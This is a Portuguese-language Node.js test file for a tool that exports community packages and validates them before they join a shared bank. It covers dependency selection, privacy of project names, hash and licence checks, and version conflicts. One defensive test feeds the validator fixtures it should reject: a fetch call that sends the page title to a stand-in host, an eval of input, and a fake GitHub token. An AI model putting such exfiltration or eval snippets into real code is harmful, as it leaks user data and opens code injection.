// Peças da comunidade: exportar só o pedido (com dependências), validar antes de entrar no banco.
import test from "node:test";
import assert from "node:assert/strict";
import { Armazem, MeioMemoria } from "../js/nucleo/armazem.js";
import { exportarPeca, validarPeca } from "../ferramentas/banco-peca.mjs";

const CONTRATO = { type: "object", properties: { largura: { type: "number" } }, required: ["largura"] };

async function armazemDeExemplo({ codigo = "export const redimensionar = (img, largura) => ({ ...img, largura });" } = {}) {
  const a = new Armazem(new MeioMemoria());
  const fontes = await a.guardar({ tipo: "compartilhado", programa: "editor", id: "fontes", versao: "1.0.0", conteudo: { "js/img.js": codigo }, runtime: "dados" });
  await a.guardar({ programa: "editor", id: "redimensionar", versao: "1.0.0", contrato: CONTRATO, runtime: "web",
    conteudo: { descricao: "Redimensiona", implementacao: { fontes: fontes.entrada.chave, arquivo: "js/img.js", entrada: "redimensionar" } } });
  await a.guardar({ programa: "editor", id: "recortar", versao: "1.0.0", contrato: CONTRATO, runtime: "web", conteudo: { descricao: "Recorta" } });
  await a.marcarUso("ferramenta/editor/redimensionar@1.0.0", "projeto-secreto-do-cliente");
  return a.exportar();
}
const QUEM = { autor: "Ana <ana@example.com>", licenca: "Apache-2.0", descricao: "Redimensionar imagem", banco: { indice: [] } };

test("exporta só a peça pedida e as dependências, sem nomes de projetos", async () => {
  const p = await exportarPeca(await armazemDeExemplo(), ["ferramenta/editor/redimensionar@1.0.0"], QUEM);
  assert.deepEqual(p.indice.map(e => e.chave).sort(), ["compartilhado/editor/fontes@1.0.0", "ferramenta/editor/redimensionar@1.0.0"]);
  assert.ok(p.indice.every(e => e.usadoPor.length === 0));
  assert.equal(Object.keys(p.blobs).length, 2);
  assert.equal(p.contribuicao.licenca, "Apache-2.0");
  assert.deepEqual((await validarPeca(p, { banco: { indice: [] } })).erros, []);
});

test("o pacote volta para outro armazém pelo importar de sempre", async () => {
  const p = await exportarPeca(await armazemDeExemplo(), ["ferramenta/editor/redimensionar@^1.0.0"], QUEM);
  const outro = new Armazem(new MeioMemoria());
  const r = await outro.importar(p);
  assert.equal(r.novos, 2);
  assert.equal((await outro.resolver("ferramenta/editor/redimensionar")).dados.implementacao.entrada, "redimensionar");
});

test("dependência que já está igual no banco oficial não vai de novo", async () => {
  const arm = await armazemDeExemplo();
  const fontes = arm.indice.find(e => e.id === "fontes");
  const p = await exportarPeca(arm, ["ferramenta/editor/redimensionar@1.0.0"], { ...QUEM, banco: { indice: [fontes] } });
  assert.deepEqual(p.indice.map(e => e.chave), ["ferramenta/editor/redimensionar@1.0.0"]);
  assert.deepEqual(p.contribuicao.dependenciasNoBanco, ["compartilhado/editor/fontes@1.0.0"]);
});

test("validador recusa conteúdo alterado, licença incompatível e contrato ausente", async () => {
  const p = await exportarPeca(await armazemDeExemplo(), ["ferramenta/editor/recortar@1.0.0"], QUEM);
  const alterado = structuredClone(p);
  alterado.indice[0].hash = "sha256:" + "0".repeat(64);
  alterado.blobs[alterado.indice[0].hash] = Object.values(p.blobs)[0];
  assert.ok((await validarPeca(alterado, { banco: { indice: [] } })).erros.some(e => e.includes("hash não confere")));
  const gpl = structuredClone(p); gpl.contribuicao.licenca = "GPL-3.0";
  assert.ok((await validarPeca(gpl, { banco: { indice: [] } })).erros.some(e => e.includes("não aceita")));
  const semContrato = structuredClone(p); semContrato.indice[0].contrato = null;
  assert.ok((await validarPeca(semContrato, { banco: { indice: [] } })).erros.some(e => e.includes("sem contrato")));
});

test("validador recusa código que acessa rede ou executa texto, e segredos", async () => {
  const rede = await exportarPeca(await armazemDeExemplo({ codigo: "fetch('https://exemplo.invalid/' + document.title)" }), ["ferramenta/editor/redimensionar@1.0.0"], QUEM);
  assert.ok((await validarPeca(rede, { banco: { indice: [] } })).erros.some(e => e.includes("fetch()")));
  const ev = await exportarPeca(await armazemDeExemplo({ codigo: "eval(entrada)" }), ["ferramenta/editor/redimensionar@1.0.0"], QUEM);
  assert.ok((await validarPeca(ev, { banco: { indice: [] } })).erros.some(e => e.includes("eval()")));
  const segredo = await exportarPeca(await armazemDeExemplo({ codigo: "const t = 'ghp_" + "a".repeat(36) + "';" }), ["ferramenta/editor/redimensionar@1.0.0"], QUEM);
  assert.ok((await validarPeca(segredo, { banco: { indice: [] } })).erros.some(e => e.includes("token do GitHub")));
});

test("conflito com o banco oficial exige versão nova", async () => {
  const p = await exportarPeca(await armazemDeExemplo(), ["ferramenta/editor/recortar@1.0.0"], QUEM);
  const banco = { indice: [{ ...p.indice[0], hash: "sha256:" + "1".repeat(64) }] };
  assert.ok((await validarPeca(p, { banco })).erros.some(e => e.includes("publique uma versão nova")));
});
